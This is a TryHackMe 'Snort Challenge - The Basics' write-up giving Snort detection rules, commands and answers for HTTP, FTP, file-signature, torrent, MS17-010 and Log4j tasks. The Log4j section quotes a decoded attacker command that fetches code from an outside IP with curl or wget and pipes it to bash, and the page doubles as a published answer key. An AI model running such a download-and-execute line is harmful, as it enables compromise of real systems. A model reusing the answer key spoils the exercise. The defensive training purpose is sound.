# Snort Challenge - The Basics

> **Date**: 2025-05-29<br>
> **Categories**: SOC | Tool | Sniffing | Analyzing<br>
> **Difficulty**: ~~Unknown~~ | ~~Easy~~ | Medium | ~~Hard~~ <br>
> **Reference**: https://tryhackme.com/room/snortchallenges1<br>

--- 

## Summary
In this challenge, different tasks had to be solved with Snort.


---

## Tasks
This challenge deals with the creation of Snort rules in different chapters.

### Writing IDS Rules (HTTP)
#### Question
> Navigate to the task folder and use the given pcap file. Write a rule to detect all TCP packets from or to port 80.<br>
> *What is the number of detected packets you got?*

#### Approach
I created the following rule:

```alert tcp any any <> any 80 (msg: "HTTP traffic detected"; sid:1000001; rev:1;)```

Then I executed following command:

```snort -r mx-3.pcap -c local.rules -A full -l .```

![Result](screenshots/1_writing_ids_rules_(http)_screenshot_2.png)

#### Answer
> 164
--- 

#### Question
> Investigate the log file.<br>
> *What is the destination address of packet 63?*

#### Approach
In the last question, a log file was created, which is read in with snort as follows. I have set the parameter `-n 63` so that I can examine the 63rd packet without a long search:

```snort -r snort.log.1748543592 -n 63```

![Result](screenshots/1_writing_ids_rules_(http)_screenshot_3.png)

#### Answer
> 216.239.59.99
---

#### Question
> Investigate the log file.<br>
> *What is the ACK number of packet 64?*

#### Approach
```snort -r snort.log.1748543592 -n 64```

![Result](screenshots/1_writing_ids_rules_(http)_screenshot_4.png)

#### Answer
>0x2E6B5384
---

#### Question
> Investigate the log file.<br>
> *What is the SEQ number of packet 62?*

#### Approach
```snort -r snort.log.1748543592 -n 62```

![Result](screenshots/1_writing_ids_rules_(http)_screenshot_5.png)

#### Answer
>0x36C21E28
---

#### Question
> Investigate the log file.<br>
> *What is the TTL of packet 65?*

#### Approach
```snort -r snort.log.1748543592 -n 65```

![Result](screenshots/1_writing_ids_rules_(http)_screenshot_6.png)

#### Answer
> 128
---

#### Question
> Investigate the log file.<br>
> *What is the source IP of packet 65?*

#### Approach
```snort -r snort.log.1748543592 -n 65```

![Result](screenshots/1_writing_ids_rules_(http)_screenshot_7.png)

#### Answer
> 145.254.160.237
---

#### Question
> Investigate the log file.<br>
> *What is the source port of packet 65?*

#### Approach
```snort -r snort.log.1748543592 -n 65```

![Result](screenshots/1_writing_ids_rules_(http)_screenshot_8.png)

#### Answer
> 3372
---

### Writing IDS Rules (FTP)
#### Question
> Navigate to the task folder. Use the given pcap file.<br>
> Write a **single** rule to detect **all TCP port 21**  traffic in the given pcap.<br>
> *What is the number of detected packets?*

#### Approach
I created the following rule:

```alert tcp any any <> any 21 (msg: "FTP traffic detected"; sid:1000001; rev:1;)```

Then I executed the following command:

```snort -r mx-3.pcap -c local.rules -A full -l .```

![Rule FTP](screenshots\2_writing_ids_rules_(ftp)_screenshot_1.png)

#### Answer
> 307
---

#### Question
> Investigate the log file.<br>
> *What is the FTP service name?*

#### Approach
At first I tried reading the generated log from the previous question and ```grep``` the Keyword *ftp* like this:

```snort -r snort.log.1748544782 | grep - i "ftp"```

I didn't receive any useful output. That's why I tried to use ```strings``` and ```grep``` to analyze the logfile for the *ftp* keyword:

```strings snort.log.1748544782 | grep -i "ftp"```

Then I received the following output:

![Result](screenshots\2_writing_ids_rules_(ftp)_screenshot_2.png)

#### Answer
> Microsoft FTP Service
---

#### Question
> **Clear the previous log and alarm files.** <br>
Deactivate/comment on the old rules.<br>
Write a rule to detect failed FTP login attempts in the given pcap.<br>
> *What is the number of detected packets?*

#### Approach
You can write snort rules that detects content within the packets. Since ftp traffic is not encrypted it is easy to read the communication between server and client. I researched for the ftp response code for a failed login attempt, which is ```530```.

So the new snort rule I created looks like this:
```alert tcp any any <> any 21 (msg: "FTP login attempt failed"; content: "530"; sid:1000001; rev:1;)```

Then I used the newly created rule on the given pcap file:

```snort -r ftp-png-gif.pcap -c local.rules -A full -l .```

Then I received the following output:

![Result](screenshots\2_writing_ids_rules_(ftp)_screenshot_3.png)

#### Answer
> 41
---

#### Question
> **Clear the previous log and alarm files.**<br>
> Deactivate/comment on the old rule.<br>
> Write a rule to detect successful FTP logins in the given pcap.<br>
> *What is the number of detected packets?*

#### Approach
Similar to the previous task I researched for the ftp response code of a successful login attempt, which is ```230```.

So the new snort rule I created looks like this:
```alert tcp any any <> any 21 (msg: "FTP login successful"; content: "230"; sid:1000001; rev:1;)```

Then I used the newly created rule on the given pcap file:

```snort -r ftp-png-gif.pcap -c local.rules -A full -l .```

![Result](screenshots\2_writing_ids_rules_(ftp)_screenshot_4.png)

#### Answer
> 1
---

#### Question
> **Clear the previous log and alarm files.**<br>
> Deactivate/comment on the old rule.<br>
> Write a rule to detect FTP login attempts with a valid username but no password entered yet.<br>
> *What is the number of detected packets?*

#### Approach
The ftp response code for the given scenario is ```331```.

```alert tcp any any <> any 21 (msg: "FTP valid username, no password"; content: "331"; sid:1000001; rev:1;)```

Then I used the newly created rule on the given pcap file:

```snort -r ftp-png-gif.pcap -c local.rules -A full -l .```

![Result](screenshots\2_writing_ids_rules_(ftp)_screenshot_5.png)

#### Answer
> 42
---

#### Question
> **Clear the previous log and alarm files.**<br>
> Deactivate/comment on the old rule.<br>
> Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.<br>
> *What is the number of detected packets?*

#### Approach
Like before I just added the additional content keyword **Administrator**.

```alert tcp any any <> any 21 (msg: "FTP valid username, no password"; content: "Administrator"; content: "331"; sid:1000001; rev:1;)```

Then I used the newly created rule on the given pcap file:

```snort -r ftp-png-gif.pcap -c local.rules -A full -l .```

![Result](screenshots\2_writing_ids_rules_(ftp)_screenshot_6.png)

#### Answer
> 7
---

### Writing IDS Rules (PNG)
#### Question
> Use the given pcap file.<br>
> Write a rule to detect the PNG file in the given pcap.<br>
> *Investigate the logs and identify the software name embedded in the packet.*

#### Approach
I know that every file has a file signature (aka *magic numbers* or *magic bytes*). PNG image files begin with an 8 byte signature that looks like ```89 50 4E 47 0D 0A 1A 0A```. You can look it up [here](https://en.wikipedia.org/wiki/List_of_file_signatures) for example.
A png file is usually transmitted via TCP. With this information I created the following rule:

```alert tcp any any <> any any (msg: "PNG found"; content: "|89 50 4E 47 0D 0A 1A 0A|"; sid: 10000001; rev:1;)```

After that I executed snort with the newly created rule:

```snort -r ftp-png-gif.pcap -c local.rules -A full -l .```

![Result](screenshots\3_writing_ids_rules_(png)_screenshot_1.png)

Then I inspected the created log file:

```snort -r snort.log.1748545142 -X```

![Result](screenshots\3_writing_ids_rules_(png)_screenshot_2.png)

#### Answer
> Adobe ImageReady
---

#### Question
> Deactivate/comment on the old rule.<br>
> Write a rule to detect the GIF file in the given pcap.<br>
> *Investigate the logs and identify the image format embedded in the packet.*

#### Approach
There are two different gif file types. GIF87a has the file signature ```47 49 46 38 37 61```, GIF89a has the file signature ```47 49 46 38 39 61```. I then created the following two rules:

```alert tcp any any <> any any (msg: "GIF87a"; content: "|47 49 46 38 37 61|"; sid: 10000001; rev:1;)```

```alert tcp any any <> any any (msg: "GIF89a"; content: "|47 49 46 38 39 61|"; sid: 10000002; rev:1;)```

I inspected the created ```alert``` file and received the answer to the question:

![Result](screenshots\3_writing_ids_rules_(png)_screenshot_3.png)

#### Answer
> GIF89a
---

### Writing IDS Rules (Torrent Metafile)
#### Question
> Use the given pcap file.<br>
> Write a rule to detect the torrent metafile in the given pcap.<br>
> *What is the number of detected packets?*

#### Approach
I couldn't find any magic number or file signature for torrent files. But torrent files usually ends with the file extension ```.torrent```. Then I created a rule that searches for the keyword ```torrent``` and tried it like this.

```alert tcp any any <> any any (msg: "Torrent"; content: "torrent"; sid: 10000001; rev:1;)```

![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_1.png)

#### Answer
> 2
---

#### Question
> Investigate the log/alarm files.<br>
> *What is the name of the torrent application?*

#### Approach
I looked at the generated log with the following command:

```snort -r snort.log.1748545746 -X```

In both packets where the alert was triggered you can see ```application/x-bittorrent```. This is the MIME type of the torrent and the actual name of the application is *bittorrent*.

![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_2.png)

#### Answer
> bittorrent
---

#### Question
> Investigate the log/alarm files.<br>
> *What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?*

#### Approach
The answer to this question was already provided in the previous question.

![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_2.png)

#### Answer
> application/x-bittorrent
---

#### Question
> Investigate the log/alarm files.<br>
> *What is the hostname of the torrent metafile?*

#### Approach
The answer to this question is in the generated log as well:

![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_3.png)

#### Answer
> tracker2.torrentbox.com
---

### Troubleshooting Rule Syntax Errors
> **In this section, you need to fix the syntax errors in the given rule files.**<br>
> You can test each ruleset with the following command structure:<br>
> ```sudo snort -c local-X.rules -r mx-1.pcap -A console```<br>

#### Question
> Fix the syntax error in **local-1.rules** file and make it work smoothly.<br>
> *What is the number of the detected packets?*

#### Approach

#### Answer
> 16
---

#### Question
> Fix the syntax error in **local-2.rules** file and make it work smoothly.<br>
> *What is the number of the detected packets?*

#### Approach

#### Answer
> 68
---

#### Question
> Fix the syntax error in **local-3.rules** file and make it work smoothly.<br>
> *What is the number of the detected packets?*

#### Approach

#### Answer
> 87
---

#### Question
> Fix the syntax error in **local-4.rules** file and make it work smoothly.<br>
> *What is the number of the detected packets?*

#### Approach

#### Answer
> 90
---

#### Question
> Fix the syntax error in **local-5.rules** file and make it work smoothly.<br>
> *What is the number of the detected packets?*

#### Approach

#### Answer
> 155
---

#### Question
> Fix the logical error in **local-6.rules** file and make it work smoothly to create alerts.<br>
> *What is the number of the detected packets?*

#### Approach

#### Answer
> 2
---

#### Question
> Fix the logical error in **local-7.rules** file and make it work smoothly to create alerts.<br>
> *What is the name of the required option:*

#### Approach

#### Answer
> msg
---

### Using External Rules (MS17-010)
#### Question
> Use the given pcap file.<br>
> Use the given rule file (local.rules) to investigate the ms1710 exploitation.<br>
> *What is the number of detected packets?*

#### Approach

#### Answer
> 25154

#### Question
> Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.<br>
> *What is the number of detected packets?*

#### Approach

#### Answer
> 12
---

#### Question
> Investigate the log/alarm files.<br>
> *What is the requested path?*

#### Approach

#### Answer
> \\\192.168.116.138\IPC$

---

#### Question
> *What is the CVSS v2 score of the MS17-010 vulnerability?*

#### Approach

#### Answer
> 9.3
---


### Using External Rules (Log4j)
#### Question
> Use the given pcap file.<br>
> Use the given rule file (local.rules) to investigate the log4j exploitation.<br>
> *What is the number of detected packets?*

#### Approach

#### Answer
> 26
---

#### Question
> Investigate the log/alarm files.<br>
> *How many rules were triggered?*

#### Approach

#### Answer
> 4
---

#### Question
> Investigate the log/alarm files.<br>
> *What are the first six digits of the triggered rule sids?*

#### Approach

#### Answer
> 210037

---

#### Question
> Use **local-1.rules** empty file to write a new rule to detect packet payloads **between 770 and 855 bytes**.<br>
> What is the number of detected packets?

#### Approach

#### Answer
> 41
---

#### Question
> Investigate the log/alarm files.<br>
> *What is the name of the used encoding algorithm?*

#### Approach

#### Answer
> Base64
---

#### Question
> Investigate the log/alarm files.<br>
> *What is the IP ID of the corresponding packet?*

#### Approach

#### Answer
> 62808
---

#### Question
> Investigate the log/alarm files.<br>
> Decode the encoded command.<br>
> *What is the attacker's command?*

#### Approach

#### Answer
> (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
---

#### Question
> *What is the CVSS v2 score of the Log4j vulnerability?*
#### Approach

#### Answer
> 9.3
---


## Tools and commands used
- snort
- grep
- strings
